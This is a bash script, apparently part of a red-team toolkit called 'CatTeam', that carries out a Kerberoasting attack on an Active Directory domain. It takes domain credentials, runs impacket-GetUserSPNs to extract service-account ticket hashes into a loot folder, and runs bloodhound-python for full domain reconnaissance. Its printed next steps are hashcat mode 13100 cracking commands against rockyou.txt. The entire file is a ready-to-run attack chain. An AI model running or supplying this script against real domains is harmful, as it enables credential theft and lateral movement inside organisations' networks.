#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export USE_LATEST=true
source "$SCRIPT_DIR/config.sh"

echo -e "${YELLOW}>>> [CatTeam 模块: AD 域收割] 启动 — Kerberoast 攻击 <<<${NC}"

# ========== 凭据获取 (OPSEC) ==========
L_USER="${LATERAL_USER:-}"
L_PASS="${LATERAL_PASS:-}"
L_DOMAIN="${LATERAL_DOMAIN}"
DC_IP="${1:-}"

if [ -z "$L_USER" ]; then
    read -p "$(echo -e "${CYAN}域用户名 (任意域用户即可): ${NC}")" L_USER
fi
if [ -z "$L_PASS" ]; then
    read -s -p "$(echo -e "${CYAN}密码 (不回显): ${NC}")" L_PASS
    echo ""
fi
if [ -z "$DC_IP" ]; then
    read -p "$(echo -e "${CYAN}域控 IP: ${NC}")" DC_IP
fi

if [ -z "$L_USER" ] || [ -z "$L_PASS" ] || [ -z "$DC_IP" ]; then
    log "${RED}[!] 需要: 域用户名 + 密码 + 域控IP${NC}"
    log "${CYAN}[~] 用法: LATERAL_USER=user LATERAL_PASS=pass ./10-kerberoast.sh <DC_IP>${NC}"
    exit 1
fi

# ========== 确保战车就绪 ==========
docker start "$CONTAINER_NAME" > /dev/null 2>&1 || true

KERB_DIR="$LOOT_DIR/kerberoast"
mkdir -p "$KERB_DIR"

# ========== Phase 1: GetUserSPNs — 提取 Kerberos 票据 ==========
log "${CYAN}[~] Phase 1: 提取 Kerberoastable 服务账户票据...${NC}"

TICKET_FILE="$KERB_DIR/kerberoast_hashes.txt"

docker exec "$CONTAINER_NAME" bash -c \
    "impacket-GetUserSPNs '${L_DOMAIN}/${L_USER}:${L_PASS}' -dc-ip '${DC_IP}' -request -outputfile /workspace/kerberoast/spn_tickets.txt 2>&1" \
    > "$KERB_DIR/getuserspns_log.txt" 2>&1 || true

if [ -f "$KERB_DIR/spn_tickets.txt" ] && [ -s "$KERB_DIR/spn_tickets.txt" ]; then
    TICKET_COUNT=$(grep -c '^\$krb5tgs\$' "$KERB_DIR/spn_tickets.txt" 2>/dev/null || echo 0)
    log "${GREEN}[+] 成功提取 ${TICKET_COUNT} 个 Kerberos 服务票据！${NC}"

    # 转换为 Hashcat 兼容格式 (mode 13100)
    cp "$KERB_DIR/spn_tickets.txt" "$KERB_DIR/kerberoast_hashes.txt"

    log "${CYAN}[~] 票据已保存: $KERB_DIR/kerberoast_hashes.txt${NC}"
    log "${CYAN}[~] 下一步: 用 Hashcat 破解 (模式 13100)${NC}"
    echo ""
    log "${YELLOW}    hashcat -m 13100 $KERB_DIR/kerberoast_hashes.txt \$WORDLIST${NC}"
    echo ""
else
    log "${YELLOW}[!] 未提取到 Kerberoastable 票据${NC}"
    log "${CYAN}[~] 可能原因: 域内无 SPN 服务账户 / 凭据权限不足${NC}"
    if [ -f "$KERB_DIR/getuserspns_log.txt" ]; then
        log "[-] 详细日志:"
        cat "$KERB_DIR/getuserspns_log.txt"
    fi
    exit 0
fi

# ========== Phase 2 (可选): BloodHound 域信息收集 ==========
log "${CYAN}[~] Phase 2: BloodHound 域关系图收集...${NC}"

BH_DIR="$KERB_DIR/bloodhound"
mkdir -p "$BH_DIR"

docker exec "$CONTAINER_NAME" bash -c \
    "bloodhound-python -u '${L_USER}' -p '${L_PASS}' -d '${L_DOMAIN}' -dc '${DC_IP}' -c All --zip -o /workspace/kerberoast/bloodhound/ 2>&1" \
    > "$BH_DIR/bloodhound_log.txt" 2>&1 || true

BH_ZIPS=$(find "$BH_DIR" -name "*.zip" 2>/dev/null | wc -l | tr -d ' ')
if [ "$BH_ZIPS" -gt 0 ]; then
    log "${GREEN}[+] BloodHound 数据收集完成 (${BH_ZIPS} 个 ZIP)${NC}"
    log "${CYAN}[~] 在 Mac 上启动 BloodHound GUI 导入: $BH_DIR/*.zip${NC}"
else
    log "${YELLOW}[!] BloodHound 收集失败 (域控可能不可达或权限不足)${NC}"
fi

# ========== 汇总 ==========
echo ""
log "${GREEN}[+] AD 域收割完毕！${NC}"
log "[-] 输出目录: $KERB_DIR/"
log "[-] 下一步建议:"
log "    1. ${CYAN}hashcat -m 13100 kerberoast_hashes.txt rockyou.txt${NC}"
log "    2. ${CYAN}在 Mac 上打开 BloodHound GUI 导入 .zip 分析攻击路径${NC}"
